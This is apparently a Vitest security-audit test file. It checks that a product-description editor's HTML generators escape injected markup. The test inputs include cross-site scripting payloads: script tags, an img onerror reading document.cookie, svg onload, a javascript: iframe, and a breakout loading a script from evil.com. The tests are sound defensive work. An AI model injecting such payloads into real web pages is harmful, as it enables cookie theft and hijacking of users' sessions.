import { describe, expect, it } from "vitest";
import {
  escapeHtml,
  generateYamaxHeroHtml,
  generateYamaxMaterialCareHtml,
  generateYamaxSizeGuideHtml,
  DEFAULT_YAMAX_ACCORDIONS,
  DEFAULT_YAMAX_HERO,
} from "../../ui/weletic/yamax-product-description-editor";

describe("SEC-AUDIT-07: Yamax Product Description Editor XSS Neutralization", () => {
  it("escapes script injection payloads in fitTip", () => {
    const maliciousPayload = '<script>alert("XSS")</script>';
    const html = generateYamaxSizeGuideHtml(maliciousPayload);

    expect(html).not.toContain("<script>");
    expect(html).toContain("&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;");
  });

  it("escapes event handler injection payloads in fitTip", () => {
    const maliciousPayload = '<img src=x onerror=alert(document.cookie)>';
    const html = generateYamaxSizeGuideHtml(maliciousPayload);

    expect(html).not.toContain("<img");
    expect(html).toContain("&lt;img src=x onerror=alert(document.cookie)&gt;");
  });

  it("escapes SVG and iframe tag breakouts in fitTip", () => {
    const payloads = [
      '<svg onload="alert(1)">',
      '<iframe src="javascript:alert(1)"></iframe>',
      '"><script src="https://evil.com/xss.js"></script>',
    ];

    for (const p of payloads) {
      const html = generateYamaxSizeGuideHtml(p);
      expect(html).not.toContain("<svg");
      expect(html).not.toContain("<iframe");
      expect(html).not.toContain("<script");
    }
  });

  it("escapes injection payloads in Material & Care accordion", () => {
    const maliciousAccordions = {
      ...DEFAULT_YAMAX_ACCORDIONS,
      fabricComposition: '60% Nylon <script>alert(1)</script>',
      washInstruction: 'Machine wash <img src=x onerror=alert(2)>',
    };

    const html = generateYamaxMaterialCareHtml(maliciousAccordions);
    expect(html).not.toContain("<script>");
    expect(html).not.toContain("<img");
    expect(html).toContain("&lt;script&gt;alert(1)&lt;/script&gt;");
    expect(html).toContain("&lt;img src=x onerror=alert(2)&gt;");
  });

  it("preserves standard safe formatting without altering legitimate text", () => {
    const normalHtml = generateYamaxSizeGuideHtml(DEFAULT_YAMAX_ACCORDIONS.fitTip);
    expect(normalHtml).toContain(DEFAULT_YAMAX_ACCORDIONS.fitTip);
    expect(normalHtml).toContain("position: sticky; left: 0px;");
    expect(normalHtml).toContain("overflow-x: auto; max-width: 100%");
  });

  it("escapes HTML in hero section correctly", () => {
    const maliciousHero = {
      ...DEFAULT_YAMAX_HERO,
      tagline: 'Super workout <script>alert("tagline")</script>',
      bullet1Title: '<b onmouseover="alert(1)">High Waist</b>',
    };
    const html = generateYamaxHeroHtml(maliciousHero);
    expect(html).not.toContain("<script>");
    expect(html).not.toContain("<b onmouseover");
    expect(html).toContain("&lt;script&gt;alert(&quot;tagline&quot;)&lt;/script&gt;");
  });
});
